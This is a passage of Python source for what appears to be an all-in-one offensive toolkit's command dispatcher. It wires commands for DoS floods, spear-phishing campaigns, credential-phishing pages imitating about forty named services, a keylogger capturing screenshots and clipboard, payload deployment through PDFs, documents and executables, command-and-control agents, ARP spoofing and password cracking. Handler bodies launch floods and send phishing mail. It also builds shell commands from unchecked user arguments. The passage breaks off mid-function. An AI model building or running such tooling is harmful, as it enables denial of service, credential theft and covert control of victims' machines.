    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # ==================== PING COMMANDS ====================
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            
            # ==================== NMAP COMMANDS ====================
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_scan': self._nmap_scan,
            'nmap_ping': self._nmap_ping,
            
            # ==================== WGET COMMANDS ====================
            'wget': self._wget,
            'wget_file': self._wget_file,
            'wget_recursive': self._wget_recursive,
            
            # ==================== CURL COMMANDS ====================
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            
            # ==================== NETCAT COMMANDS ====================
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            
            # ==================== TRACEROUTE COMMANDS ====================
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            
            # ==================== WHOIS COMMANDS ====================
            'whois': self._whois,
            
            # ==================== DNS COMMANDS ====================
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'host': self._host,
            
            # ==================== LOCATION COMMANDS ====================
            'location': self._location,
            
            # ==================== SSH COMMANDS ====================
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # ==================== TRAFFIC GENERATION ====================
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # ==================== NIKTO COMMANDS ====================
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            
            # ==================== DOS ATTACKS ====================
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            
            # ==================== SPEAR PHISHING ====================
            'spear_create': self._spear_create,
            'spear_send': self._spear_send,
            'spear_list': self._spear_list,
            
            # ==================== AGENT COMMANDS ====================
            'agent_register': self._agent_register,
            'agent_command': self._agent_command,
            'agent_list': self._agent_list,
            'agent_status': self._agent_status,
            
            # ==================== NETWORK MONITOR ====================
            'netmon_start': self._netmon_start,
            'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status,
            'netmon_packets': self._netmon_packets,
            
            # ==================== KEYLOGGER ====================
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # ==================== DEPLOYMENT ====================
            'deploy_pdf': self._deploy_pdf,
            'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link,
            'deploy_executable': self._deploy_executable,
            'deploy_docx': self._deploy_docx,
            'deploy_list': self._deploy_list,
            'deploy_track': self._deploy_track,
            
            # ==================== CRACKING COMMANDS ====================
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            
            # ==================== ARP SPOOFING ====================
            'arp_spoof': self._arp_spoof,
            'arp_stop': self._arp_stop,
            'arp_status': self._arp_status,
            'arp_history': self._arp_history,
            
            # ==================== MAC COMMANDS ====================
            'mac_info': self._mac_info,
            'mac_scan': self._mac_scan,
            'mac_vendor': self._mac_vendor,
            
            # ==================== NAT COMMANDS ====================
            'nat_info': self._nat_info,
            'nat_public': self._nat_public,
            'nat_private': self._nat_private,
            
            # ==================== DOCKER COMMANDS ====================
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            
            # ==================== EMAIL COMMANDS ====================
            'email_compose': self._email_compose,
            'email_send': self._email_send,
            'email_list': self._email_list,
            'email_delete': self._email_delete,
            
            # ==================== PDF REPORT COMMANDS ====================
            'report_generate': self._report_generate,
            'report_list': self._report_list,
            
            # ==================== PLATFORM COMMANDS ====================
            'platform_send': self._platform_send,
            'platform_status': self._platform_status,
            'platform_results': self._platform_results,
            
            # ==================== SOCIAL ENGINEERING ====================
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_github': lambda _: self._phish('github'),
            'phish_slack': lambda _: self._phish('slack'),
            'phish_zoom': lambda _: self._phish('zoom'),
            'phish_teams': lambda _: self._phish('teams'),
            'phish_dropbox': lambda _: self._phish('dropbox'),
            'phish_adobe': lambda _: self._phish('adobe'),
            'phish_steam': lambda _: self._phish('steam'),
            'phish_roblox': lambda _: self._phish('roblox'),
            'phish_twitch': lambda _: self._phish('twitch'),
            'phish_xbox': lambda _: self._phish('xbox'),
            'phish_playstation': lambda _: self._phish('playstation'),
            'phish_cashapp': lambda _: self._phish('cashapp'),
            'phish_venmo': lambda _: self._phish('venmo'),
            'phish_chase': lambda _: self._phish('chase'),
            'phish_wellsfargo': lambda _: self._phish('wellsfargo'),
            'phish_office365': lambda _: self._phish('office365'),
            'phish_onedrive': lambda _: self._phish('onedrive'),
            'phish_icloud': lambda _: self._phish('icloud'),
            'phish_pinterest': lambda _: self._phish('pinterest'),
            'phish_reddit': lambda _: self._phish('reddit'),
            'phish_snapchat': lambda _: self._phish('snapchat'),
            'phish_tiktok': lambda _: self._phish('tiktok'),
            'phish_tinder': lambda _: self._phish('tinder'),
            'phish_bumble': lambda _: self._phish('bumble'),
            'phish_custom': lambda _: self._phish('custom'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'list_templates': self._list_templates,
            'view_template': self._view_template,
            'edit_template': self._edit_template,
            'create_template': self._create_template,
            'delete_template': self._delete_template,
            
            # ==================== SCAN COMMANDS ====================
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # ==================== IP MANAGEMENT ====================
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # ==================== SYSTEM COMMANDS ====================
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            
            # ==================== ANIMATION COMMANDS ====================
            'anim_spinner': self._anim_spinner,
            'anim_matrix': self._anim_matrix,
            'anim_pulse': self._anim_pulse,
            'anim_wave': self._anim_wave,
            'anim_glitch': self._anim_glitch,
            'anim_octopus': self._anim_octopus,
            
            # ==================== HELP ====================
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== ANIMATION COMMANDS ====================
    def _anim_spinner(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        message = ' '.join(args[1:]) if len(args) > 1 else "Processing"
        TerminalAnimation.spinner(duration, message)
        return {'success': True, 'output': f"🎬 Spinner animation displayed for {duration}s"}
    
    def _anim_matrix(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.matrix_rain(duration)
        return {'success': True, 'output': f"🌧️ Matrix rain animation displayed for {duration}s"}
    
    def _anim_pulse(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 CYCLOPUS"
        TerminalAnimation.pulse_animation(text, duration)
        return {'success': True, 'output': f"💓 Pulse animation displayed for {duration}s"}
    
    def _anim_wave(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🌊 CYCLOPUS"
        TerminalAnimation.wave_animation(text, duration)
        return {'success': True, 'output': f"🌊 Wave animation displayed for {duration}s"}
    
    def _anim_glitch(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 1.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 GLITCH"
        TerminalAnimation.glitch_effect(text, duration)
        return {'success': True, 'output': f"⚡ Glitch animation displayed for {duration}s"}
    
    def _anim_octopus(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.octopus_swim(duration)
        return {'success': True, 'output': f"🐙 Octopus swim animation displayed for {duration}s"}
    
    # ==================== PING COMMANDS ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic(f'ping6 -c 4 {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self._generic(f'nmap -sn {network}')
        return result
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        targets = ' '.join(args)
        result = self._generic(f'fping {targets}')
        return result
    
    # ==================== NMAP COMMANDS ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_scan <target> <ports>'}
        target = args[0]
        ports = args[1]
        result = self._generic(f'nmap -p {ports} {target}')
        return result
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'ping')
        return {'success': result.success, 'output': result.output}
    
    # ==================== WGET COMMANDS ====================
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget(url, output)
        return {'success': result.success, 'output': result.output}
    
    def _wget_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_file <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self.tools.wget(url, filename)
        return {'success': result.success, 'output': result.output}
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        url = args[0]
        result = self._generic(f'wget -r -l 2 -np -nd {url}')
        return result
    
    # ==================== CURL COMMANDS ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        url = args[0]
        result = self.tools.curl(url, 'OPTIONS')
        return {'success': result.success, 'output': result.output}
    
    # ==================== NETCAT COMMANDS ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic(f'nc -lvp {port}')
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic(f'nc -zv {host} {ports}')
        return result
    
    # ==================== TRACEROUTE COMMANDS ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    # ==================== WHOIS COMMANDS ====================
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    # ==================== DNS COMMANDS ====================
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        domain = args[0]
        result = self._generic(f'dig {domain}')
        return result
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        domain = args[0]
        result = self._generic(f'nslookup {domain}')
        return result
    
    def _host(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: host <domain>'}
        domain = args[0]
        result = self._generic(f'host {domain}')
        return result
    
    # ==================== LOCATION COMMANDS ====================
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    # ==================== SSH COMMANDS ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # ==================== TRAFFIC GENERATION ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== NIKTO COMMANDS ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== DOS ATTACKS ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== SPEAR PHISHING ====================
    def _spear_create(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
        name = args[0]
        subject = args[1]
        from_email = args[2]
        template_file = args[3]
        targets_file = args[4]
        
        try:
            with open(template_file, 'r') as f:
                template = f.read()
            with open(targets_file, 'r') as f:
                targets = json.load(f)
            
            campaign = self.spear.create_campaign(name, template, subject, from_email, targets)
            return {'success': True, 'output': f"Campaign created: {campaign['id']} - {campaign['name']}"}
        except Exception as e:
            return {'success': False, 'output': f"Failed to create campaign: {e}"}
    
    def _spear_send(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
        campaign_id = args[0]
        result = self.spear.send_campaign(campaign_id)
        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
    
    def _spear_list(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        campaigns = self.spear.get_campaigns()
        if not campaigns:
            return {'success': True, 'output': 'No campaigns found'}
        output = "Spear Phishing Campaigns:\n"
        for c in campaigns:
            output += f"  • {c['id']} - {c['target_email']} ({c['status']}) - Sent: {c['sent_at']}\n"
        return {'success': True, 'output': output}
    
    # ==================== AGENT COMMANDS ====================
    def _agent_register(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_register <name> <ip>'}
        name = args[0]
        ip = args[1]
        hostname = args[2] if len(args) > 2 else "unknown"
        os_info = args[3] if len(args) > 3 else "unknown"
        result = self.agent.register_agent(name, hostname, ip, os_info)
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    def _agent_command(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_command <agent_id> <command>'}
        agent_id = args[0]
        command = ' '.join(args[1:])
        success = self.agent.send_command(agent_id, command)
        return {'success': success, 'output': f"Command sent to agent {agent_id}" if success else "Failed to send command"}
    
    def _agent_list(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        agents = self.agent.get_agents()
        if not agents:
            return {'success': True, 'output': 'No agents registered'}
        output = "Registered Agents:\n"
        for a in agents:
            status = "🟢" if a.get('status') == 'online' else "🔴"
            output += f"  {status} {a['id']} - {a['name']} ({a.get('ip_address', 'unknown')})\n"
            output += f"     Last heartbeat: {a.get('last_seen', 'Never')}\n"
        return {'success': True, 'output': output}
    
    def _agent_status(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: agent_status <agent_id>'}
        agent = self.agent.get_agent(args[0])
        if not agent:
            return {'success': False, 'output': f"Agent {args[0]} not found"}
        return {'success': True, 'output': json.dumps(agent, indent=2)}
    
    # ==================== NETWORK MONITOR ====================
    def _netmon_start(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n"
        output += f"  Running: {self.network_monitor.running}\n"
        output += f"  Interface: {self.network_monitor.interface}\n"
        output += f"  Promiscuous: {self.network_monitor.promiscuous}\n"
        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
        output += f"\nTraffic Statistics:\n"
        for proto, count in stats.get('protocols', {}).items():
            output += f"  {proto}: {count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets:
            return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
